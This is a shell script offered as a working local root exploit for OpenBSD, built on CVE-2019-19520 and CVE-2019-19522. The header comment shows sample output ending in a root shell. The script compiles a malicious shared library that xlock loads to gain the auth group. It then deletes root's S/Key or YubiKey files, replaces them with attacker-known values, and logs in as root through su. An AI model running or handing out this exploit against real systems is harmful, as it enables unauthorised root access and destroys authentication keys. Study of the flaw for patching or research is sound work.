#!/bin/sh
# openbsd-authroot - OpenBSD local root exploit for CVE-2019-19520 and CVE-2019-19522
# Code mostly stolen from Qualys PoCs:
# - https://www.openwall.com/lists/oss-security/2019/12/04/5
#
# Uses CVE-2019-19520 to gain 'auth' group permissions via xlock;
# and CVE-2019-19520 to gain root permissions via S/Key or YubiKey
# (requires S/Key or YubiKey authentication to be enabled).
# ---
# $ ./openbsd-authroot
# openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
# [*] checking system ...
# [*] system supports YubiKey authentication
# [*] id: uid=1002(test) gid=1002(test) groups=1002(test)
# [*] compiling ...
# [*] running Xvfb ...
# [*] testing for CVE-2019-19520 ...
# (EE) 
# Fatal server error:
# (EE) Server is already active for display 66
#         If this server is no longer running, remove /tmp/.X66-lock
#         and start again.
# (EE) 
# [+] success! we have auth group permissions
#
# WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).
#
# [*] trying CVE-2019-19522 (YubiKey) ...
# Your password is: krkhgtuhdnjclrikikklulkldlutreul
# Password:
# ksh: /etc/profile[2]: source: not found
# # id                                                                                                                                                                                    
# uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
# ---
# 2019-12-06 - <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520

echo "openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)"

echo "[*] checking system ..."

if grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q yubikey ; then
  echo "[*] system supports YubiKey authentication"
  target='yubikey'
elif grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q skey ; then
  echo "[*] system supports S/Key authentication"
  target='skey'
  if ! test -d /etc/skey/ ; then
    echo "[-] S/Key authentication enabled, but has not been initialized"
    exit 1
  fi
else
  echo "[-] system does not support S/Key / YubiKey authentication"
  exit 1
fi

echo "[*] id: `id`"

echo "[*] compiling ..."

cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

cc -fpic -shared -s -o swrast_dri.so swrast_dri.c
rm -rf swrast_dri.c

echo "[*] running Xvfb ..."

display=":66"

env -i /usr/X11R6/bin/Xvfb $display -cc 0 &

echo "[*] testing for CVE-2019-19520 ..."

group=$(echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display)

if [ "$group" = "auth" ]; then
  echo "[+] success! we have auth group permissions"
else
  echo "[-] failed to acquire auth group permissions"
  exit 1
fi

# uncomment to drop to a shell with auth group permissions
#env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display ; exit

echo
echo "WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C)."
echo
sleep 5

if [ "$target" = "skey" ]; then
  echo "[*] trying CVE-2019-19522 (S/Key) ..."
  echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: EGG LARD GROW HOG DRAG LAIN"
  env -i TERM=vt220 su -l -a skey
fi

if [ "$target" = "yubikey" ]; then
  echo "[*] trying CVE-2019-19522 (YubiKey) ..."
  echo "rm -rf /var/db/yubikey/root.* ; echo 32d32ddfb7d5 > /var/db/yubikey/root.uid ; echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: krkhgtuhdnjclrikikklulkldlutreul"
  env -i TERM=vt220 su -l -a yubikey
fi
